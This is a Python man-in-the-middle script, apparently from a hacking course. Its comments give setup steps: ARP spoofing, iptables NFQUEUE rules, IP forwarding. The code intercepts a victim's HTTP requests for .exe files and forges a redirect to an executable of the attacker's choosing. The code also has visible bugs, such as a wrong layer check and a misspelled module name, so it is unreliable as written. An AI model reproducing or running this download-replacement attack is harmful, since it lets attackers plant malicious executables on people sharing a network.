# iptables -I FORWARD -j NFQUEUE --queue-num 0 -> can be automated using subprocess module 
# --> Run above command after performing MITM attack on the vitim using ARP Spoofing to forward all the packets through attacker machine
# pip install netfilterqueue
# iptables --flush --> To delete IP Tables created at the start

# iptables -I INPUT -j NFQUEU --queue-num 0 
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush


#Steps to test the script on victim machine 
# prepare iptables using --> iptables -I FORWARD -j NFQUEUE --queue-num 0
# start arp_spoof.py script on attacker machine 
# start replace_download.py script on attacker machine
# echo 1 > /proc/sys/net/ipv4/ip_forward --> to forward the traffic from attacker machine to the internet

#!/usr/bin/env python
import netfilterqueue # used because we can't modify packets using scapy 
import scapy.all as scapy
# scapy is used to sniff the packets (analyze and print them) and netfilterqueue (to modify packets we use netfilter) is used to modify the packets

# to test the script 
# prepare IP TABLES 
# clear browsing history


ack_list = []  # to store the ACK numbers of the packets that we want to modify
# This script is used to inject a custom page when the victim tries to download an .exe file

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        if scapy_packet[scapy.TCP].dport == 80: #8080 -> if using bettercap proxy
            if b".exe" in scapy_packet[scapy.Raw].load and b"172.16.74.12" not in scapy_packet[scapy.Raw].load:  
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                
        elif scapy_packet[scapy.TCP].sport == 80: #8080 -> if using bettercap proxy
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-711.exe\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept() # to forward the packets from victim to the destination
    # packet.drop() # to drop the packets from victim to the destination thereby blocking the internet access

queue = netfileterqueue.NetfilterQueue()
queue.bind(0, process_packet)  
queue.run()

#service apache2 start --> command to start apache server on kali linux
#/var/www/html/index.html --> file to be modified to show the custom page   
# ping -c 1 www.google.com